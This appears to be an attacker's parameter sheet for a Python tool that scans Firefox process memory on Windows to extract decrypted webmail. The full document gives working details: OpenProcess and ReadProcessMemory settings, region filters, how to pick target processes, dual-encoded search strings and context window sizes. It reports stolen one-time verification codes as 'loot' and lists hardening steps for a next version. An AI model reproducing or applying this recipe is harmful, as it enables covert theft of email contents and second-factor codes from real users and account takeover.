# Memory-scan parameter map (proven values)

Source: `scripts/memscan.py` (session-tested v1, byte-identical in `scripts/`),
findings C10-23/C10-24, HANDOFF.md §3.1. Every value below was exercised live on
Firefox 157.0.1 / Windows 11 26200, medium integrity.

## Win32 API surface (ctypes, stdlib only)

- `kernel32.OpenProcess(PROCESS_VM_READ=0x0010 | PROCESS_QUERY_INFORMATION=0x0400,
  False, pid)` — read-only access set only; sufficient at medium integrity for
  same-user processes. Never request write/operation rights.
- `VirtualQueryEx(h, addr, MBI, sizeof(MBI))` — walk `addr = base + RegionSize`
  until user-space ceiling `0x7fffffffffff`; guard `addr <= base` (wrap) → break.
- Region filter: `State == MEM_COMMIT (0x1000)` and `Protect` in
  {0x02 PAGE_READONLY, 0x04 PAGE_READWRITE, 0x08 PAGE_WRITECOPY,
  0x20 PAGE_EXECUTE_READ, 0x40 PAGE_EXECUTE_READWRITE}; skip regions ≥ 1 GB.
- `ReadProcessMemory` in 4 MB chunks (`CH = 4*1024*1024`); a failed chunk with
  `GetLastError() == 299` (ERROR_PARTIAL_COPY) is normal across guarded pages —
  continue, don't abort the process.
- MBI struct field order matters: BaseAddress, AllocationBase, AllocationProtect
  (DWORD), RegionSize (c_size_t), State, Protect, Type (DWORD).

## Target selection

- Enumerate `firefox.exe` PIDs + WorkingSetSize; sort descending; scan the top 8.
  Proven: the tab holding the viewed mail was among the largest processes
  (~3.9 GB total read across 8 processes).
- On Win11 24H2+/26200 `wmic` is REMOVED — enumerate via
  `Get-CimInstance Win32_Process -Filter "Name='firefox.exe'"` and pass PIDs on
  argv (`python -X utf8 memscan.py <pid>...`). The script's built-in wmic
  fallback is dead code on such hosts.

## Needle strategy

- Every needle encoded TWICE: `s.encode('utf-8')` and `s.encode('utf-16-le')`.
  Proven: JS-heap copies exist in both encodings; dual needles found the DOM copy
  (UTF-8) and the string copy (UTF-16LE) of the same mail.
- Session needles: `Your verification code`, `Paybis`, `NanoGPT` — pick
  product/subject terms likely to sit adjacent to the secret (code, link, body).

## Context windows and dedupe

- `CTX_BEFORE = 1500`, `CTX_AFTER = 9000` bytes around each hit — proven enough
  to capture a complete verification-mail body plus surrounding UI strings.
- Dedupe key: `(needle, ctx[380:420])` — a fixed slice inside the context;
  collapses the many heap copies of the same text into one readable record.
- Hard cap 400 written contexts per run (log overflow safe).

## Output format

- `OUT` text file (edit the hardcoded path per run); records look like:
  `===== pid <pid> needle=<needle> =====` followed by the context decoded
  UTF-8 with `errors='replace'`, NUL bytes stripped.
- Console per PID: `scanned %.1f MB, hits N`; final `TOTAL hits:` line.

## Proven result (what "success" looked like)

- Full decrypted body of the Paybis "Your verification code" mail including the
  one-time code (644245, expires 5 min) and the NanoGPT code (357852), plus
  thread/UI strings — zero visible action, read-only. Evidence pointer:
  `loot\C14\proton-hits.txt` (operator-side loot).

## Hardening checklist for a v2 (bundle-side agentpack copy)

Applied and live-verified in the 2026-10-14/15 bundle pass (state.json CLOSE
verification record); the hardened SOURCE is not in this drop — re-apply these
on top of the v1 here if you adapt it:

1. empty-`--pids` guard (never scan with no PIDs supplied),
2. self-scan exclusion (skip the scanning process's own PID),
3. `MAX_HITS=5000` OOM guard on the hits list,
4. per-PID abort-skip (a failing PID doesn't kill the sweep),
5. 1 MB chunks instead of 4 MB (smaller allocation footprint).
